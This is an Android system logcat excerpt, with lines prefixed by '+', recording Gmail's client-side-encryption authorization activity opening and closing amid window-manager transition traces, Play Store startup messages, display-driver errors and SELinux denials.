+09-04 07:18:26.380  1431  6903 V ActivityTaskManager: TaskLaunchParamsModifier: phase=3 task=Task{e08c7fc #62 type=standard A=10221:com.google.android.gm.appauth} activity=ActivityRecord{43966703 u0 com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity t-1} display-area-from-source=DefaultTaskDisplayArea@42689679 display-id=0 task-display-area-windowing-mode=1 suggested-display-area=DefaultTaskDisplayArea@42689679 inherit-from-source=fullscreen non-freeform-task-display-area display-area=DefaultTaskDisplayArea@42689679 default-portrait freeform-size-mismatch=Rect(276, 694 - 804, 1774)
+09-04 07:18:26.380  1431  6903 I ActivityTaskManager: START u0 {dat=https://client-side-encryption.google.com/... flg=0x24000000 xflg=0x4 cmp=com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity} with LAUNCH_SINGLE_TASK from uid 10221 (com.google.android.gm) (sr=97860364) (BAL_ALLOW_GRACE_PERIOD) result code=0
+09-04 07:18:26.380  1431  8109 V WindowManager: deferTransitionReady deferReadyDepth=1 stack=com.android.server.wm.WindowOrganizerController.applyTransaction:717 com.android.server.wm.WindowOrganizerController.applyTransaction:256 android.window.IWindowOrganizerController$Stub.onTransact:219 com.android.server.wm.WindowOrganizerController.onTransact:239 android.os.Binder.execTransactInternal:1364 
+09-04 07:18:26.380  1431  8109 E TransitionChain: Mismatch between current collecting (TransitionRecord{c229d0b id=208 type=OPEN flags=0x0 parallelCollectType=NONE recentsDisplayId=-1 c=[
+09-04 07:18:26.380  1431  8109 E TransitionChain:    ChangeInfo{81867e8 container=WindowedMagnification:0:31@21597542 flags=0x0}
+09-04 07:18:26.380  1431  8109 E TransitionChain:    ChangeInfo{77d1e01 container=DefaultTaskDisplayArea@42689679 flags=0x0}
+09-04 07:18:26.380  1431  8109 E TransitionChain:    ChangeInfo{53044a6 container=ActivityRecord{43966703 u0 com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity t62} flags=0x0}
+09-04 07:18:26.380  1431  8109 E TransitionChain:    ChangeInfo{8dbfee7 container=AppZoomOut:2:14@110852147 flags=0x0}
+09-04 07:18:26.380  1431  8109 E TransitionChain:    ChangeInfo{b001a94 container=Task{e08c7fc #62 type=standard A=10221:com.google.android.gm.appauth} flags=0x0}
+09-04 07:18:26.380  1431  8109 E TransitionChain:    ChangeInfo{99c993d container=Display{#0 state=ON size=1080x2400 ROTATION_0} flags=0x0}
+09-04 07:18:26.380  1431  8109 E TransitionChain: ]
+09-04 07:18:26.380  1431  8109 E TransitionChain: }) and chain (TransitionRecord{c229d0b id=208 type=OPEN flags=0x0 parallelCollectType=NONE recentsDisplayId=-1 c=[
+09-04 07:18:26.380  1431  8109 E TransitionChain:    ChangeInfo{81867e8 container=WindowedMagnification:0:31@21597542 flags=0x0}
+09-04 07:18:26.380  1431  8109 E TransitionChain:    ChangeInfo{77d1e01 container=DefaultTaskDisplayArea@42689679 flags=0x0}
+09-04 07:18:26.380  1431  8109 E TransitionChain:    ChangeInfo{53044a6 container=ActivityRecord{43966703 u0 com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity t62} flags=0x0}
+09-04 07:18:26.380  1431  8109 E TransitionChain:    ChangeInfo{8dbfee7 container=AppZoomOut:2:14@110852147 flags=0x0}
+09-04 07:18:26.380  1431  8109 E TransitionChain:    ChangeInfo{b001a94 container=Task{e08c7fc #62 type=standard A=10221:com.google.android.gm.appauth} flags=0x0}
+09-04 07:18:26.380  1431  8109 E TransitionChain:    ChangeInfo{99c993d container=Display{#0 state=ON size=1080x2400 ROTATION_0} flags=0x0}
+09-04 07:18:26.380  1431  8109 E TransitionChain: ]
+09-04 07:18:26.380  1431  8109 E TransitionChain: })
+09-04 07:18:26.381  1431  8109 V WindowManager: continueTransitionReady deferReadyDepth=0 stack=com.android.server.wm.WindowOrganizerController.applyTransaction:864 com.android.server.wm.WindowOrganizerController.applyTransaction:256 android.window.IWindowOrganizerController$Stub.onTransact:219 com.android.server.wm.WindowOrganizerController.onTransact:239 android.os.Binder.execTransactInternal:1364 
+09-04 07:18:26.381  2052  2074 V RecentTasksController: Notify recent tasks changed
+09-04 07:18:26.381  2052  2074 V RecentTasksController: Notify recent tasks changed
+09-04 07:18:26.381 14762 14762 D RecentTasksList: invalidateLoadedTasks - previous requestLoadId: -1
+09-04 07:18:26.381 14762 14762 D RecentTasksList: invalidateLoadedTasks - previous requestLoadId: -1
+09-04 07:18:26.381  2052  2074 V WindowManagerShell: Transition requested (#208): android.os.BinderProxy@3f5bc4e TransitionRequestInfo { type = OPEN, triggerTask = TaskInfo{userId=0 taskId=62 effectiveUid=10221 displayId=0 isRunning=true baseIntent=Intent { dat=https://client-side-encryption.google.com/... flg=0x34800000 cmp=com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity } baseActivity=ComponentInfo{com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity} topActivity=ComponentInfo{com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity} origActivity=null realActivity=ComponentInfo{com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity} realActivityIsAppLockEnabled=false numActivities=1 lastActiveTime=26601364 supportsMultiWindow=true supportsMultiWindowWithoutConstraints=true resizeMode=2 isResizeable=true minWidth=-1 minHeight=-1 defaultMinSize=220 token=WCT{android.os.BinderProxy@155216f} topActivityType=1 pictureInPictureParams=null shouldDockBigOverlays=false launchIntoPipHostTaskId=-1 lastParentTaskIdBeforePip=-1 displayCutoutSafeInsets=Rect(0, 132 - 0, 0) topActivityInfo=ActivityInfo{c493e7c com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity} launchCookies=[] positionInParent=Point(0, 0) parentTaskId=-1 isFocused=false isInteractive=false isVisible=false isVisibleRequested=false isTopActivityNoDisplay=false isSleeping=false locusId=null displayAreaFeatureId=1 isTopActivityTransparent=false isActivityStackTransparent=false lastNonFullscreenBounds=Rect(276, 694 - 804, 1774) leafTaskBoundsFromOptions= false capturedLink=null capturedLinkTimestamp=0 requestedVisibleTypes=503 topActivityRequestOpenInBrowserEducationTimestamp=0 appCompatTaskInfo=AppCompatTaskInfo { topActivityInSizeCompat=false isLeafTask= true eligibleForLetterboxEducation= false isLetterboxEducationEnabled= false isLetterboxDoubleTapEnabled= false eligibleForUserAspectRatioButton= false topActivityBoundsLetterboxed= false isFromLetterboxDoubleTap= false topActivityLetterboxVerticalPosition= -1 topActivityLetterboxHorizontalPosition= -1 topActivityLetterboxWidth=-1 topActivityLetterboxHeight=-1 topActivityAppBounds=Rect(0, 0 - 1080, 2400) isUserFullscreenOverrideEnabled=false isSystemFullscreenOverrideEnabled=false hasMinAspectRatioOverride=false topActivityLetterboxBounds=null topNonResizableActivityAspectRatio=-1.0} topActivityMainWindowFrame=null isAppBubble=false}, pipChange = null, remoteTransitionInfo = null, displayChanges = null, requestedLocation = null, userChange = null, windowingLayerChange = null, fullscreenRequestChange = null, flags = 0, debugId = 208 }
+09-04 07:18:26.381  2052  2074 W DisconnectHandler: No disconnect change found in the transition, not handling request.
+09-04 07:18:26.381  2052  2074 D ShellSplitScreen: logExit: no-op, mLoggerSessionId is null
+09-04 07:18:26.386  8828  8828 D WindowOnBackDispatcher: setTopOnBackInvokedCallback (unwrapped): android.app.Activity$$ExternalSyntheticLambda0@fb4c05a
+09-04 07:18:26.386  1431  8109 W InputChannel-JNI: Channel already disposed.
+09-04 07:18:26.387  1431  2256 D CoreBackPreview: Window{355d064 u0 com.android.vending/com.google.android.finsky.activities.MainActivityPrivate}: Setting back callback OnBackInvokedCallbackInfo{mCallback=android.window.IOnBackInvokedCallback$Stub$Proxy@1db088a, mPriority=-1, mIsAnimationCallback=false, mOverrideBehavior=0}
+09-04 07:18:26.390  1431  2003 I MR2ServiceImpl: Updating composite discovery preference | preference: RouteDiscoveryRequest{ preferredFeatures={}, activeScan=false }, active routers: []
+09-04 07:18:26.391  8828  8828 D VRI[MainActivityPrivate]: WindowInsets changed: 1080x2400 statusBars:[0,132,0,0] navigationBars:[0,0,0,63] mandatorySystemGestures:[0,164,0,84] 
+09-04 07:18:26.394  8828  8857 I Finsky  : [37] PN init
+09-04 07:18:26.394  1431  2256 D WindowManager: setClientSurface Surface(name=VRI-com.android.vending/com.google.android.finsky.activities.MainActivityPrivate#1622)/@0xc888971 for 355d064 com.android.vending/com.google.android.finsky.activities.MainActivityPrivate
+09-04 07:18:26.396  8828  8828 I Surface : Creating surface for consumer unnamed-8828-9 with slotExpansion=1 for 64 slots
+09-04 07:18:26.396  8828  8828 I Surface : Creating surface for consumer VRI[MainActivityPrivate]#8(BLAST Consumer)8 with slotExpansion=1 for 64 slots
+09-04 07:18:26.402  1431  8109 D WindowManager: setClientSurface Surface(name=VRI-Splash Screen com.google.android.gm#1623)/@0xe692356 for d0c282c Splash Screen com.google.android.gm
+09-04 07:18:26.404   548   601 E hwc-display: [PrimaryDisplay] resetColorMappingInfoForClientComp:: resetColorMappingInfo() idx=1 error(-22)
+09-04 07:18:26.404   548   601 E hwc-display: Fail to open file /data/vendor/log/hwc/PrimaryDisplay_hwc_error_log0.txt, error: Permission denied
+09-04 07:18:26.404   548   601 E hwc-display: Fail to open file /data/log/PrimaryDisplay_hwc_error_log0.txt, error: No such file or directory
+09-04 07:18:26.404   548   601 E hwc-display: Unable to open log file for PrimaryDisplay_hwc_error_log0.txt
+09-04 07:18:26.404  2052  2083 I Surface : Creating surface for consumer unnamed-2052-181 with slotExpansion=1 for 64 slots
+09-04 07:18:26.404  2052  2083 I Surface : Creating surface for consumer VRI[gm]#173(BLAST Consumer)173 with slotExpansion=1 for 64 slots
+09-04 07:18:26.400   548   548 W HwBinder:548_1: type=1400 audit(0.0:754): avc:  denied  { search } for  name="log" dev="dm-57" ino=709 scontext=u:r:hal_graphics_composer_default:s0 tcontext=u:object_r:vendor_log_file:s0 tclass=dir permissive=0
+09-04 07:18:26.400   548   548 W HwBinder:548_1: type=1400 audit(0.0:755): avc:  denied  { search } for  name="log" dev="dm-57" ino=709 scontext=u:r:hal_graphics_composer_default:s0 tcontext=u:object_r:vendor_log_file:s0 tclass=dir permissive=0
+09-04 07:18:26.406  8828  8828 E AbstractLogEventBuilder: The provided ProductIdOrigin 3 is not one of the process-level expected values: 1 or 2
+09-04 07:18:26.408  1431  2328 D CorePackageUpdate: Couldn't find a persistent state for task= 62
+09-04 07:18:26.410 14762 14768 W System  : A resource failed to call release. 
+09-04 07:18:26.410 14762 14768 W System  : A resource failed to call release. 
+09-04 07:18:26.410 14762 14768 W System  : A resource failed to call release. 
+09-04 07:18:26.414  8828  8828 D WindowLayoutComponentImpl: Register WindowLayoutInfoListener on Context=com.google.android.finsky.activities.MainActivity@f36d388, of which baseContext=ru@3a8662a, of which baseContext=android.app.ContextImpl@c507c1b
+09-04 07:18:26.415  2052  2802 V WindowManagerShell: onTransitionReady(transaction=6146098212965)
+09-04 07:18:26.415  2052  2074 V WindowManagerShell: onTransitionReady (#208) android.os.BinderProxy@3f5bc4e: {id=208 t=OPEN f=0x0 trk=0 r=[0@Point(0, 0)] c=[
+09-04 07:18:26.415  2052  2074 V WindowManagerShell:         {m=OPEN f=MOVE_TO_TOP|FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=62#1617)/@0x18f9998 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0},
+09-04 07:18:26.415  2052  2074 V WindowManagerShell:         {m=TO_BACK f=FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=61#1609)/@0xe80e5f1 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0}
+09-04 07:18:26.415  2052  2074 V WindowManagerShell:     ]}
+09-04 07:18:26.416  2052  2074 V WindowManagerShell: Transition (#208) android.os.BinderProxy@3f5bc4e@0 ready while (#207) android.os.BinderProxy@9eee684@0 is still animating. Notify the animating transition in case they can be merged
+09-04 07:18:26.416  2052  2074 V WindowManagerShell: Transition animation finished (aborted=false), notifying core (#207) android.os.BinderProxy@9eee684@0
+09-04 07:18:26.420  1431  1486 V WindowManager: Sent Transition (#208) createdAt=09-04 07:18:26.374 via request=TransitionRequestInfo { type = OPEN, triggerTask = TaskInfo{userId=0 taskId=62 effectiveUid=10221 displayId=0 isRunning=true baseIntent=Intent { dat=https://client-side-encryption.google.com/... flg=0x34800000 cmp=com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity } baseActivity=ComponentInfo{com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity} topActivity=ComponentInfo{com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity} origActivity=null realActivity=ComponentInfo{com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity} realActivityIsAppLockEnabled=false numActivities=1 lastActiveTime=26601364 supportsMultiWindow=true supportsMultiWindowWithoutConstraints=true resizeMode=2 isResizeable=true minWidth=-1 minHeight=-1 defaultMinSize=220 token=WCT{RemoteToken{14cb530 Task{e08c7fc #62 type=standard A=10221:com.google.android.gm.appauth}}} topActivityType=1 pictureInPictureParams=null shouldDockBigOverlays=false launchIntoPipHostTaskId=-1 lastParentTaskIdBeforePip=-1 displayCutoutSafeInsets=Rect(0, 132 - 0, 0) topActivityInfo=ActivityInfo{ffdf5a9 com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity} launchCookies=[] positionInParent=Point(0, 0) parentTaskId=-1 isFocused=false isInteractive=false isVisible=false isVisibleRequested=false isTopActivityNoDisplay=false isSleeping=false locusId=null displayAreaFeatureId=1 isTopActivityTransparent=false isActivityStackTransparent=false lastNonFullscreenBounds=Rect(276, 694 - 804, 1774) leafTaskBoundsFromOptions= false capturedLink=null capturedLinkTimestamp=0 requestedVisibleTypes=503 topActivityRequestOpenInBrowserEducationTimestamp=0 appCompatTaskInfo=AppCompatTaskInfo { topActivityInSizeCompat=false isLeafTask= true eligibleForLetterboxEducation= false isLetterboxEducationEnabled= false isLetterboxDoubleTapEnabled= false eligibleForUserAspectRatioButton= false topActivityBoundsLetterboxed= false isFromLetterboxDoubleTap= false topActivityLetterboxVerticalPosition= -1 topActivityLetterboxHorizontalPosition= -1 topActivityLetterboxWidth=-1 topActivityLetterboxHeight=-1 topActivityAppBounds=Rect(0, 0 - 1080, 2400) isUserFullscreenOverrideEnabled=false isSystemFullscreenOverrideEnabled=false hasMinAspectRatioOverride=false topActivityLetterboxBounds=null topNonResizableActivityAspectRatio=-1.0} topActivityMainWindowFrame=null isAppBubble=false}, pipChange = null, remoteTransitionInfo = null, displayChanges = null, requestedLocation = null, userChange = null, windowingLayerChange = null, fullscreenRequestChange = null, flags = 0, debugId = 208 }
+09-04 07:18:26.420  1431  1486 V WindowManager:     startWCT=WindowContainerTransaction { changes= {} hops= [] flags= 0 errorCallbackToken=null taskFragmentOrganizer=null }
+09-04 07:18:26.421  1431  1486 V WindowManager:     info={id=208 t=OPEN f=0x0 trk=0 r=[0@Point(0, 0)] c=[
+09-04 07:18:26.421  1431  1486 V WindowManager:         {WCT{RemoteToken{14cb530 Task{e08c7fc #62 type=standard A=10221:com.google.android.gm.appauth}}} m=OPEN f=MOVE_TO_TOP|FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=62#1617)/@0x60c6fd7 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0},
+09-04 07:18:26.421  1431  1486 V WindowManager:         {WCT{RemoteToken{88dee93 Task{f077b21 #61 type=standard A=10134:com.android.vending}}} m=TO_BACK f=FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=61#1609)/@0x1ad79ff sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0}
+09-04 07:18:26.421  1431  1486 V WindowManager:     ]}
+09-04 07:18:26.421  1431  1486 V WindowManager: Finish Transition (#207): created at 09-04 07:18:26.151 collect-started=0.048ms request-sent=8.108ms started=9.121ms ready=188.522ms sent=206.882ms commit=27.716ms finished=269.475ms
+09-04 07:18:26.421 16366 16366 D VRI[MainActivity]: visibilityChanged oldVisibility=true newVisibility=false
+09-04 07:18:26.421  2052  2074 V WindowManagerShell: Playing animation for (#208) android.os.BinderProxy@3f5bc4e@0
+09-04 07:18:26.421  2052  2074 D ShellSplitScreen: startAnimation: transition=208 isSplitActive=false
+09-04 07:18:26.421  2052  2074 V ShellRecents: RecentsTransitionHandler.startAnimation: no controller found
+09-04 07:18:26.421  2052  2074 V WindowManagerShell: Transition doesn't have explicit remote, search filters for match for {id=208 t=OPEN f=0x0 trk=0 r=[0@Point(0, 0)] c=[{m=OPEN f=MOVE_TO_TOP|FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=62#1617)/@0x18f9998 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0},{m=TO_BACK f=FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=61#1609)/@0xe80e5f1 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0}]}
+09-04 07:18:26.422  2052  2074 V WindowManagerShell:  Checking filter Pair{{types=[] flags=0x0 notFlags=0x0 checks=[{atype=undefined independent=true modes=[CLOSE,TO_BACK] flags=IN_TASK_WITH_EMBEDDED_ACTIVITY mustBeTask=false order=ANY topActivity=null launchCookie=null taskFragmentToken=android.os.BinderProxy@cb7dc2b windowingMode=undefined isCrossDisplayMove=false}]} RemoteTransition { remoteTransition = android.window.IRemoteTransition$Stub$Proxy@3a00888, appThread = android.app.IApplicationThread$Stub$Proxy@eed4221, debugName = overlayBackTransition, filter = {types=[] flags=0x0 notFlags=0x0 checks=[{atype=undefined independent=true modes=[CLOSE,TO_BACK] flags=IN_TASK_WITH_EMBEDDED_ACTIVITY mustBeTask=false order=ANY topActivity=null launchCookie=null taskFragmentToken=android.os.BinderProxy@cb7dc2b windowingMode=undefined isCrossDisplayMove=false}]} }}
+09-04 07:18:26.422  2052  2074 V WindowManagerShell:  Checking filter Pair{{types=[] flags=0x0 notFlags=0x0 checks=[{atype=dream independent=true modes=[OPEN,TO_FRONT] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{atype=home independent=true modes=[CLOSE,TO_BACK] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false}]} RemoteTransition { remoteTransition = android.window.IRemoteTransition$Stub$Proxy@bb16646, appThread = android.app.IApplicationThread$Stub$Proxy@7d61007, debugName = LauncherToDream, filter = {types=[] flags=0x0 notFlags=0x0 checks=[{atype=dream independent=true modes=[OPEN,TO_FRONT] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{atype=home independent=true modes=[CLOSE,TO_BACK] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false}]} }}
+09-04 07:18:26.422  2052  2074 V WindowManagerShell:  Checking filter Pair{{types=[] flags=0x0 notFlags=0x0 checks=[{atype=standard independent=false modes=[CHANGE] flags=NONE mustBeTask=true order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=true}]} RemoteTransition { remoteTransition = android.window.IRemoteTransition$Stub$Proxy@b712534, appThread = android.app.IApplicationThread$Stub$Proxy@2badf5d, debugName = QuickstepDisplayMove, filter = {types=[] flags=0x0 notFlags=0x0 checks=[{atype=standard independent=false modes=[CHANGE] flags=NONE mustBeTask=true order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=true}]} }}
+09-04 07:18:26.422  2052  2074 V WindowManagerShell:  Checking filter Pair{{types=[] flags=0x0 notFlags=0x100 checks=[{atype=home independent=true modes=[OPEN,TO_FRONT] flags=NONE mustBeTask=false order=ANY topActivity=ComponentInfo{com.google.android.apps.nexuslauncher/com.google.android.apps.nexuslauncher.NexusLauncherActivity} launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{atype=standard independent=true modes=[CLOSE,TO_BACK] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{NOT atype=undefined independent=true modes=[] flags=NONE mustBeTask=true order=ANY topActivity=null launchCookie=null customAnim=true windowingMode=undefined isCrossDisplayMove=false}]} RemoteTransition { remoteTransition = android.window.IRemoteTransition$Stub$Proxy@88da0d2, appThread = android.app.IApplicationThread$Stub$Proxy@fb9a5a3, debugName = QuickstepLaunchHome, filter = {types=[] flags=0x0 notFlags=0x100 checks=[{atype=home independent=true modes=[OPEN,TO_FRONT] flags=NONE mustBeTask=false order=ANY topActivity=ComponentInfo{com.google.android.apps.nexuslauncher/com.google.android.apps.nexuslauncher.NexusLauncherActivity} launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{atype=standard independent=true modes=[CLOSE,TO_BACK] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{NOT atype=undefined independent=true modes=[] flags=NONE mustBeTask=true order=ANY topActivity=null launchCookie=null customAnim=true windowingMode=undefined isCrossDisplayMove=false}]} }}
+09-04 07:18:26.422  2052  2074 V WindowManagerShell:  Delegate animation for (#208) to null
+09-04 07:18:26.422  2052  2074 V WindowManagerShell: start default transition animation, info = {id=208 t=OPEN f=0x0 trk=0 r=[0@Point(0, 0)] c=[{m=OPEN f=MOVE_TO_TOP|FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=62#1617)/@0x18f9998 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0},{m=TO_BACK f=FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=61#1609)/@0xe80e5f1 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0}]}
+09-04 07:18:26.422  2052  2074 V WindowManagerShell: loadAnimation: anim=android.view.animation.AnimationSet@7b0b744 animAttr=0x9 type=OPEN isEntrance=false
+09-04 07:18:26.422  2052  2074 V WindowManagerShell: loadAnimation: anim=android.view.animation.AnimationSet@acf02d animAttr=0x8 type=OPEN isEntrance=true
+09-04 07:18:26.423  2052  2074 V WindowManagerShell:  animated by com.android.wm.shell.transition.DefaultTransitionHandler@f745678
+09-04 07:18:26.426  2052  2074 V ShellTaskOrganizer: Task appeared taskId=62 listener=FullscreenTaskListener
+09-04 07:18:26.426  2052  2074 V ShellTaskOrganizer: Fullscreen Task Appeared: #62
+09-04 07:18:26.426  2052  2074 D ShellPackageUpdate: PackageUpdateController: Setting handlePackageUpdate for task: 62
+09-04 07:18:26.427  1431  2256 E TransitionChain: Can't collect into a chain with no transition
+09-04 07:18:26.427  2052  2074 V RecentTasksController: Notify recent tasks changed
+09-04 07:18:26.427 14762 14762 D RecentTasksList: invalidateLoadedTasks - previous requestLoadId: -1
+09-04 07:18:26.429 12952 12952 W AppAuth : No stored state - unable to handle response
+09-04 07:18:26.430  2052  2074 V WindowManagerShell: Transition requested (#209): android.os.BinderProxy@da0034f TransitionRequestInfo { type = CLOSE, triggerTask = TaskInfo{userId=0 taskId=62 effectiveUid=10221 displayId=0 isRunning=false baseIntent=Intent { dat=https://client-side-encryption.google.com/... flg=0x34800000 cmp=com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity } baseActivity=null topActivity=null origActivity=null realActivity=ComponentInfo{com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity} realActivityIsAppLockEnabled=false numActivities=0 lastActiveTime=26601393 supportsMultiWindow=true supportsMultiWindowWithoutConstraints=true resizeMode=2 isResizeable=true minWidth=-1 minHeight=-1 defaultMinSize=220 token=WCT{android.os.BinderProxy@155216f} topActivityType=1 pictureInPictureParams=null shouldDockBigOverlays=false launchIntoPipHostTaskId=-1 lastParentTaskIdBeforePip=-1 displayCutoutSafeInsets=Rect(0, 0 - 0, 0) topActivityInfo=null launchCookies=[] positionInParent=Point(0, 0) parentTaskId=-1 isFocused=true isInteractive=true isVisible=true isVisibleRequested=true isTopActivityNoDisplay=false isSleeping=false locusId=null displayAreaFeatureId=1 isTopActivityTransparent=false isActivityStackTransparent=true lastNonFullscreenBounds=Rect(276, 694 - 804, 1774) leafTaskBoundsFromOptions= false capturedLink=null capturedLinkTimestamp=0 requestedVisibleTypes=503 topActivityRequestOpenInBrowserEducationTimestamp=0 appCompatTaskInfo=AppCompatTaskInfo { topActivityInSizeCompat=false isLeafTask= true eligibleForLetterboxEducation= false isLetterboxEducationEnabled= false isLetterboxDoubleTapEnabled= false eligibleForUserAspectRatioButton= false topActivityBoundsLetterboxed= false isFromLetterboxDoubleTap= false topActivityLetterboxVerticalPosition= -1 topActivityLetterboxHorizontalPosition= -1 topActivityLetterboxWidth=-1 topActivityLetterboxHeight=-1 topActivityAppBounds=Rect(0, 0 - 0, 0) isUserFullscreenOverrideEnabled=false isSystemFullscreenOverrideEnabled=false hasMinAspectRatioOverride=false topActivityLetterboxBounds=null topNonResizableActivityAspectRatio=-1.0} topActivityMainWindowFrame=null isAppBubble=false}, pipChange = null, remoteTransitionInfo = null, displayChanges = null, requestedLocation = null, userChange = null, windowingLayerChange = null, fullscreenRequestChange = null, flags = 0, debugId = 209 }
+09-04 07:18:26.430  2052  2074 W DisconnectHandler: No disconnect change found in the transition, not handling request.
+09-04 07:18:26.430   545  1550 I libbinder.BpBinder: onLastStrongRef automatically unlinking death recipients for binder (0xb40000787be7de10) with descriptor: '(not cached)'
+09-04 07:18:26.434 15172 15172 I ContentCaptureHelper: Setting logging level to OFF
+09-04 07:18:26.435 16366 16379 D HWUI    : endAllActiveAnimators on 0xb400007327933800 (RippleDrawable) with handle 0xb40000741796e500
+09-04 07:18:26.436  1431  1486 D HintManagerService: Sent cleanup message for uid 10355
+09-04 07:18:26.440  2052  2074 V RecentTasksController: Notify recent tasks changed
+09-04 07:18:26.441 14762 14762 D RecentTasksList: invalidateLoadedTasks - previous requestLoadId: -1
+09-04 07:18:26.441  8828  8857 I Finsky  : [37] Verifying app locale consistency (current locale = English (United States))
+09-04 07:18:26.441  8828  8857 I Finsky  : [37] Language Split Installed = true
+09-04 07:18:26.441 11126 11126 I ContentCaptureHelper: Setting logging level to OFF
+09-04 07:18:26.441  8828  8857 I Finsky  : [37] Has Inconsistent Persistent Cache = false (cache has locale(s) = [en-US])
+09-04 07:18:26.441  8828  8857 I Finsky  : [37] Has Inconsistent Memory Cache = false (initial locale = English (United States))
+09-04 07:18:26.443  8828  9085 E Volley  : [82] oxm.a: Unexpected response code 404 for https://play-fe.googleapis.com/fdfe/resolveLink?url=market%3A%2F%2Fdetails%3Fid%3Dcom.android.setting%26url%3Ds%253A%252F%252F%2523Intent%253Baction%253Dandroid.settings.SETTINGS%253Bend&ref=com.google.android.gms
+09-04 07:18:26.444  2052  2366 V WindowManagerShell: onTransitionReady(transaction=6146098212989)
+09-04 07:18:26.444  2052  2074 V WindowManagerShell: onTransitionReady (#209) android.os.BinderProxy@da0034f: {id=209 t=CLOSE f=0x0 trk=0 r=[0@Point(0, 0)] c=[
+09-04 07:18:26.444  2052  2074 V WindowManagerShell:         {m=CLOSE f=FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=62#1617)/@0x583856b sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0},
+09-04 07:18:26.444  2052  2074 V WindowManagerShell:         {m=TO_FRONT f=MOVE_TO_TOP|FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=61#1609)/@0x76898c8 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0}
+09-04 07:18:26.444  2052  2074 V WindowManagerShell:     ]}
+09-04 07:18:26.445  2052  2074 V WindowManagerShell: Transition (#209) android.os.BinderProxy@da0034f@0 ready while (#208) android.os.BinderProxy@3f5bc4e@0 is still animating. Notify the animating transition in case they can be merged
+09-04 07:18:26.445  2052  2074 V WindowManagerShell: Transition animation finished (aborted=false), notifying core (#208) android.os.BinderProxy@3f5bc4e@0
